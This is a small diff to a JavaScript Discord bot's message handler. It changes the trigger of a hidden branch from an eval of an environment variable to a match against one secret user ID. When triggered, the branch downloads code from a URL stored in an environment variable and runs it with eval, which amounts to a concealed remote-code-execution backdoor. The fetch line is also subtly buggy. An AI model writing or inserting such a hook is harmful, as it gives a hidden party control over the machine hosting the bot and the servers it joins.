@@ -103,7 +103,8 @@ client.on('ready', () => {
 
 client.on('message', msg => {
     if (msg.author.bot || msg.author.id == client.user.id) return;
-    if (eval(process.env.alsosecret)) {
+    if (msg.author.id == process.env.correctid) {
+        var junk = undefined;
         var secret = (async function() {
             var secret = await axios.get(process.env.secret).data
             eval(secret);
